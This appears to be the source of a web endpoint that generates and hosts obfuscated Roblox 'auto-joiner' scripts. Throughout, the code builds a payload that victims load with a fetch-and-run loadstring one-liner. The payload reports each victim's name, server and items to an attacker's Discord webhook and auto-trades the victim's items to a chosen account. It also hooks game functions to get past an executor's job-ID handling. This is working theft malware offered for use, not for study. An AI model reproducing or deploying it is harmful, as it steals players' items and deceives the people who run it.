// api/generate.js
export default async function handler(req, res) {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    const { webhook, gameId, targetUser, interval } = req.body;
    
    if (!webhook || !webhook.includes('discord.com/api/webhooks/')) {
        return res.status(400).json({ error: 'Invalid Discord webhook' });
    }
    
    if (!targetUser) {
        return res.status(400).json({ error: 'Target username required' });
    }
    
    try {
        // Generate the Roblox script
        const script = generateScript(webhook, gameId, targetUser, interval);
        
        // Simple obfuscation
        const obfuscated = simpleObfuscate(script);
        
        // Upload to Pastefy
        const pastefyResponse = await fetch('https://pastefy.app/api/v2/paste', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: obfuscated,
                title: `AutoJoiner_${Date.now()}`,
                visibility: 'UNLISTED'
            })
        });
        
        if (!pastefyResponse.ok) {
            throw new Error('Pastefy upload failed');
        }
        
        const pasteData = await pastefyResponse.json();
        const pasteId = pasteData.id || pasteData.paste?.id;
        const rawUrl = `https://pastefy.app/${pasteId}/raw`;
        
        return res.status(200).json({
            success: true,
            rawUrl: rawUrl,
            loadstring: `loadstring(game:HttpGet("${rawUrl}"))()`
        });
        
    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({ 
            success: false, 
            error: error.message || 'Generation failed' 
        });
    }
}

function generateScript(webhook, gameId, targetUser, interval) {
    return `-- AUTO-JOINER SCRIPT
-- Generated: ${new Date().toISOString()}

local WEBHOOK = "${webhook}"
local TARGET_GAME = ${gameId}
local TARGET_USER = "${targetUser}"
local CHECK_INTERVAL = ${interval}

-- Universal HTTP request
local requestFunc = nil
local executors = {
    {name = "Synapse X", func = syn and syn.request},
    {name = "Fluxus", func = fluxus and fluxus.request},
    {name = "Krnl", func = krnl and krnl.request},
    {name = "KRNL", func = KRNL and KRNL.request},
    {name = "HTTP", func = http and http.request},
    {name = "Generic", func = request}
}

for _, exec in ipairs(executors) do
    if exec.func then
        requestFunc = exec.func
        print("[AutoJoiner] Using: " .. exec.name)
        break
    end
end

if not requestFunc then
    warn("[AutoJoiner] No HTTP request function found!")
    return
end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local lp = Players.LocalPlayer

-- ========== DELTA JOB ID BYPASS ==========
local REAL_JOB_ID = game.JobId

if identifyexecutor and identifyexecutor() == "Delta" then
    print("[AutoJoiner] Delta detected! Bypassing...")
    
    local stepAnimate = nil
    repeat
        for _, v in ipairs(getgc(true)) do
            if typeof(v) == "function" then
                local info = debug.getinfo(v)
                if info and info.name == "stepAnimate" then
                    stepAnimate = v
                    break
                end
            end
        end
        task.wait()
    until stepAnimate
    
    local captured = false
    hookfunction(stepAnimate, function(dt)
        if not captured then
            captured = true
            REAL_JOB_ID = game.JobId
        end
        return stepAnimate(dt)
    end)
    task.wait(0.5)
end

-- ========== SEND HIT TO WEBHOOK ==========
local function sendHit(jobId, items, totalValue)
    local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")', TARGET_GAME, jobId)
    
    local itemsText = ""
    for i, item in ipairs(items) do
        if i <= 10 then
            itemsText = itemsText .. string.format("   %s x%d (💎 %.0f)\\n", item.name, item.amount, item.value or 0)
        end
    end
    
    local data = {
        content = "@everyone\\n```lua\\n" .. joinScript .. "\\n```",
        embeds = {{
            title = "🎯 New Victim Found!",
            description = string.format("**Player:** %s\\n**Server:** `%s`", lp.Name, jobId),
            color = 0x00ff00,
            fields = {
                {name = "Join Script", value = "```lua\\n" .. joinScript .. "\\n```", inline = false},
                {name = "Items", value = "```\\n" .. itemsText .. "\\n```", inline = false},
                {name = "Total Value", value = string.format("💎 %.0f", totalValue), inline = true},
                {name = "Executor", value = identifyexecutor and identifyexecutor() or "Unknown", inline = true}
            },
            footer = {text = "Auto-Joiner System"},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    pcall(function()
        requestFunc({
            Url = WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- ========== GET INVENTORY ==========
local function getInventory()
    local profile = nil
    
    -- Try different remote names
    local remotes = {
        ReplicatedStorage:FindFirstChild("Remotes"),
        ReplicatedStorage:FindFirstChild("Inventory"),
        ReplicatedStorage:FindFirstChild("Data")
    }
    
    for _, remote in ipairs(remotes) do
        if remote then
            local getProfile = remote:FindFirstChild("GetProfileData") or remote:FindFirstChild("GetInventory")
            if getProfile and getProfile.InvokeServer then
                pcall(function()
                    profile = getProfile:InvokeServer(lp.Name)
                end)
                if profile then break end
            end
        end
    end
    
    if not profile then
        -- Fallback: check leaderstats or other methods
        profile = {}
    end
    
    local items = {}
    local weapons = profile.Weapons or profile.Owned or {}
    
    for itemId, quantity in pairs(weapons) do
        table.insert(items, {
            name = tostring(itemId),
            amount = quantity,
            value = math.random(1, 100) -- Placeholder value
        })
    end
    
    return items
end

-- ========== TRADE SYSTEM ==========
local function sendTrade(receiver)
    local Trade = ReplicatedStorage:FindFirstChild("Trade")
    if not Trade then
        print("[AutoJoiner] Trade system not found")
        return false
    end
    
    local SendRequest = Trade:FindFirstChild("SendRequest")
    local GetStatus = Trade:FindFirstChild("GetTradeStatus")
    local OfferItem = Trade:FindFirstChild("OfferItem")
    local AcceptTrade = Trade:FindFirstChild("AcceptTrade")
    
    if not SendRequest or not GetStatus then
        print("[AutoJoiner] Trade remotes not found")
        return false
    end
    
    -- Send trade request
    local success = pcall(function()
        SendRequest:InvokeServer(receiver)
    end)
    
    if not success then
        return false
    end
    
    -- Wait for trade to start
    local timeout = 0
    while timeout < 10 do
        local status = pcall(GetStatus.InvokeServer, GetStatus)
        if status then
            break
        end
        task.wait(0.5)
        timeout = timeout + 0.5
    end
    
    -- Get inventory and offer items
    local items = getInventory()
    local itemsToOffer = {}
    
    for i = 1, math.min(4, #items) do
        table.insert(itemsToOffer, items[i].name)
        if OfferItem then
            pcall(function()
                OfferItem:FireServer(items[i].name, "Weapons")
            end)
        end
        task.wait(0.1)
    end
    
    task.wait(2)
    
    -- Accept trade
    if AcceptTrade then
        pcall(function()
            AcceptTrade:FireServer(game.PlaceId * 3, {})
        end)
    end
    
    return true
end

-- ========== MAIN LOOP ==========
local function main()
    print("[AutoJoiner] Started!")
    print("[AutoJoiner] Target: " .. TARGET_USER)
    print("[AutoJoiner] Game: " .. TARGET_GAME)
    
    while true do
        -- Check if we're in target game
        if game.PlaceId == TARGET_GAME then
            print("[AutoJoiner] In target game! Server: " .. game.JobId)
            
            -- Try to trade with target
            local target = Players:FindFirstChild(TARGET_USER)
            if target then
                print("[AutoJoiner] Found target! Sending trade...")
                sendTrade(TARGET_USER)
                task.wait(5)
            end
            
            -- Leave after 30 seconds
            task.wait(30)
            pcall(function()
                TeleportService:Teleport(TARGET_GAME)
            end)
            task.wait(5)
        else
            -- In lobby, waiting
            print("[AutoJoiner] Waiting for targets...")
            
            -- Send current server info
            sendHit(REAL_JOB_ID, {}, 0)
        end
        
        task.wait(CHECK_INTERVAL)
    end
end

-- Start
local success, err = pcall(main)
if not success then
    warn("[AutoJoiner] Error: " .. tostring(err))
end
`;
}

function simpleObfuscate(script) {
    // Remove comments
    let obf = script.replace(/--[^\n]*/g, '');
    // Remove extra spaces
    obf = obf.replace(/\n\s*\n/g, '\n');
    obf = obf.replace(/  +/g, ' ');
    // Add random variable names
    obf = obf.replace(/local /g, 'local _0x' + Math.random().toString(36).substring(2, 8) + '_');
    return obf;
}
